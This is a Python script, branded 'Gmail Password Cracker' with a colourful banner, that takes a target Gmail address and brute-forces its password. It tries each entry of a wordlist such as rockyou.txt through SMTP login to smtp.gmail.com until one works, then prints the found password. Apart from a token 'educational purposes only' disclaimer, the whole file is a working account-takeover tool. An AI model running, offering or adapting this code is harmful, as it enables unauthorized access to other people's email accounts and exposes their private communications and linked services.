import smtplib
import sys
import random
import time
import os
from os import system

# ========= COLOR SETUP =========
COLORS = ["\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[95m", "\033[96m"]
BOLD = "\033[1m"
RESET = "\033[0m"

def color_text(text):
    return random.choice(COLORS) + text + RESET

# ========= ASCII ART =========
ascii_art = """
⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟
"""

# ========= BANNER =========
def banner():
    gradient = [
        "\033[95m╔════════════════════════════════════════════════════════════════════╗",
        "\033[94m║                🔥 GMAIL PASSWORD CRACKER 🔥                        ║",
        "\033[96m║ 🚨 Brute Force Gmail Accounts (Educational Purposes Only) 🚨      ║",
        "\033[92m║                  🧠 Built By: Crypto Lord 📚                      ║",
        "\033[91m╚════════════════════════════════════════════════════════════════════╝",
    ]
    for line in gradient:
        print(line)
        time.sleep(0.05)
    print(RESET)

def loading(msg, seconds=3):
    for i in range(seconds):
        sys.stdout.write(f"\r{color_text(msg)}{'.' * (i % 4)}   ")
        sys.stdout.flush()
        time.sleep(1)
    print()

def intro_screen():
    os.system("clear" if os.name == "posix" else "cls")
    banner()
    print(color_text(ascii_art))
    print(color_text(f"{BOLD}⚠️  This Tool Was Built For Educational Purposes Only"))
    print(color_text(f"{BOLD}🎯  Use Responsibly — Password Cracking is Illegal Without Permission"))
    print()
    input(color_text(f"{BOLD}👉 Press ENTER to start cracking... "))

# ========= MAIN SCRIPT =========
def main():
    intro_screen()
    
    loading("Initializing SMTP connection", 2)
    
    try:
        smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
        smtpserver.ehlo()
        smtpserver.starttls()
        print(color_text(f"{BOLD}✅ SMTP Connection Established!"))
    except Exception as e:
        print(color_text(f"{BOLD}❌ Failed to connect to SMTP server: {e}"))
        sys.exit(1)

    print("\n" + "="*60)
    user = input(color_text(f"{BOLD}🎯 Enter The Target Gmail Address => "))
    print("\n")

    pwd = input(color_text(f"{BOLD}🔑 Enter '1' to use the inbuilt passwords list\n📁 Enter '2' to Add a custom password list\n=> "))

    if pwd == '1':
        passswfile = "rockyou.txt"
        print(color_text(f"{BOLD}📂 Using default password file: rockyou.txt"))
    elif pwd == '2':
        print("\n")
        passswfile = input(color_text(f"{BOLD}📁 Name The File Path (For Password List) => "))
    else:
        print("\n")
        print(color_text(f"{BOLD}❌ Invalid input!"))
        sys.exit(1)

    try:
        passswfile = open(passswfile, "r", encoding='utf-8', errors='ignore')
        print(color_text(f"{BOLD}✅ Password file loaded successfully!"))
    except Exception as e:
        print(color_text(f"{BOLD}❌ Error opening password file: {e}"))
        sys.exit(1)

    print("\n" + "="*60)
    print(color_text(f"{BOLD}🚀 Starting brute force attack..."))
    print(color_text(f"{BOLD}⏳ This may take a while..."))
    print("="*60 + "\n")

    found = False
    attempts = 0

    for password in passswfile:
        password = password.strip()
        if not password:
            continue
            
        attempts += 1
        try:
            smtpserver.login(user, password)
            print(color_text(f"{BOLD}🎉 SUCCESS! Password Found: {password}"))
            found = True
            break
        except smtplib.SMTPAuthenticationError:
            if attempts % 10 == 0:
                print(color_text(f"{BOLD}🔍 Attempt {attempts}: Still searching..."))
            else:
                print(color_text(f"{BOLD}❌ Password Not Correct!!: {password}"))

    if not found:
        print(color_text(f"{BOLD}😞 Password not found in the list. Tried {attempts} passwords."))

    passswfile.close()
    smtpserver.quit()

    print("\n" + "="*60)
    print(color_text(f"{BOLD}🎯 Attack completed!"))
    print("="*60)

if __name__ == "__main__":
    main()